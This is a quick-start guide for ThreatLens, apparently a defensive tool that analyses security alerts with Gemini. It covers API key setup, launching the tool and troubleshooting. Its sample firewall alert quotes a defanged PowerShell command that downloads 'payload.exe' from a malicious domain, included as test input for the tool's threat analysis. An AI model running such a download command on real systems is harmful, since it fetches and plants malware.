# 🚀 Quick Start Guide

Get ThreatLens up and running in 5 minutes!

## 📦 What You Need

1. Python 3.8+ installed
2. A Google Gemini API key (free)
3. A web browser

## ⚡ 3-Step Setup

### Step 1: Get Your API Key (2 minutes)

1. Go to https://makersuite.google.com/app/apikey
2. Sign in with Google
3. Click "Create API Key"
4. Copy the key

### Step 2: Setup Backend (2 minutes)

```bash
# Navigate to backend
cd backend

# Install dependencies
pip install -r requirements.txt

# Create .env file
cp .env.example .env

# Edit .env and add your Gemini API key
# Change this line:
GEMINI_API_KEY=your-gemini-api-key-here
# To your actual key:
GEMINI_API_KEY=AIzaSyC_your_actual_key_here

# Start the backend
python3 app.py
```

### Step 3: Open Frontend (1 minute)

```bash
# In a new terminal, navigate to frontend
cd frontend

# Open in browser
open index.html  # Mac
# or
xdg-open index.html  # Linux
# or
start index.html  # Windows
# or just drag the file into your browser
```

## 🎯 First Analysis

1. Click **"Load Sample"** button to load example alert
2. Click **"Analyze Threat"** 
3. Wait ~30 seconds
4. View your threat intelligence report!

## ✅ Verification

Backend running correctly:
```
 * Running on http://0.0.0.0:5000
Gemini AI: ✓ Configured
```

Frontend working:
- You see the ThreatLens interface
- No console errors in browser DevTools (F12)

## 🔥 Test with Real Alert

Try analyzing this real-world scenario:

```
FIREWALL ALERT: Blocked outbound connection
Source: 10.0.0.15 
Destination: 45.141.84.223:443
Time: 2024-01-29 14:23:45
User: john.doe
Process: powershell.exe

DETAILS:
PowerShell command detected:
Invoke-WebRequest http://malicious-domain[.]com/payload.exe -OutFile C:\temp\payload.exe

File created: C:\temp\payload.exe
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

Additional alerts:
- Multiple failed login attempts from same source IP
- Lateral movement detected to 10.0.0.22
- Suspicious registry modifications
```

Paste this into ThreatLens and see what you get!

## 🎓 What's Happening Behind the Scenes

1. **IOC Extraction**: Finds IPs, domains, hashes automatically
2. **Gemini AI**: Understands the alert context
3. **Threat Intel**: Queries VirusTotal, AbuseIPDB for reputation
4. **Analysis**: AI correlates all data and assesses risk
5. **Report**: Generates actionable recommendations

## 🔧 Optional: Add More API Keys

For enhanced analysis, add these (optional):

### VirusTotal (Recommended)
```bash
# Get key: https://www.virustotal.com/gui/my-apikey
# Add to .env:
VIRUSTOTAL_API_KEY=your-key-here
```

### AbuseIPDB (Recommended)
```bash
# Get key: https://www.abuseipdb.com/account/api
# Add to .env:
ABUSEIPDB_API_KEY=your-key-here
```

Restart backend after adding new keys:
```bash
# Stop backend (Ctrl+C)
# Start again
python3 app.py
```

## 🐛 Common Issues

### "Module not found" error
```bash
# Make sure you're in the backend directory
cd backend
pip install -r requirements.txt
```

### "Gemini AI service not configured"
```bash
# Check your .env file has the key
cat .env | grep GEMINI
# Should show: GEMINI_API_KEY=AIzaSy...
```

### Frontend shows connection error
```bash
# Make sure backend is running
# You should see: "Running on http://0.0.0.0:5000"
# If not, restart: python3 app.py
```

### Port 5000 already in use
```bash
# Kill the process using port 5000
# On Mac/Linux:
lsof -ti:5000 | xargs kill -9

# Or change port in backend/app.py:
# app.run(debug=True, host='0.0.0.0', port=5001)
# And update frontend API_URL to http://localhost:5001
```

## 📚 Next Steps

1. ✅ Read [README.md](../README.md) for complete documentation
2. ✅ Check [API_KEYS_SETUP.md](API_KEYS_SETUP.md) for more API keys
3. ✅ Analyze real alerts from your environment
4. ✅ Customize and extend the tool

## 💡 Pro Tips

**Tip 1**: Use "Load Sample" to test without typing
**Tip 2**: Add VirusTotal key for much better IOC analysis
**Tip 3**: Save firewall rules from the Actions tab
**Tip 4**: Copy executive summary for incident reports

## 🎉 You're Ready!

Start analyzing threats and let AI do the heavy lifting!

---

**Need help?** Check the main [README.md](../README.md) or troubleshooting section.
